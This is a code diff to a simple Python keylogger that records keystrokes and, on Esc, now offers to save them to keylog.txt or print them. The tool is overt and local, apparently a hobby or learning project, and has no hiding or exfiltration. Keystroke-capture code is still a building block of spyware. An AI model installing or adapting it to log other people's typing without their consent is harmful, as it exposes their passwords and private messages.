@@ -9,8 +9,17 @@ keysPressed = []
 def pushedDown(key):
     if key == keyboard.Key.esc:
         print("Keylogger off")
-        print("Keys pressed:", keysPressed)
-        sys.exit()
+        question = input("Would you like to export [E] this to a .txt file or print [P] to console?: ")
+        if question == "e" or question == "E":
+            with open("keylog.txt", "w") as file:
+                file.write("Keys pressed: " + str(keysPressed))
+            sys.exit()
+        elif question == "p" or question == "P":
+            print("Keys pressed:", keysPressed)
+            sys.exit()
+        else:
+            print("Invalid")
+            sys.exit()
     else:
         try:
             keysPressed.append(key.char)
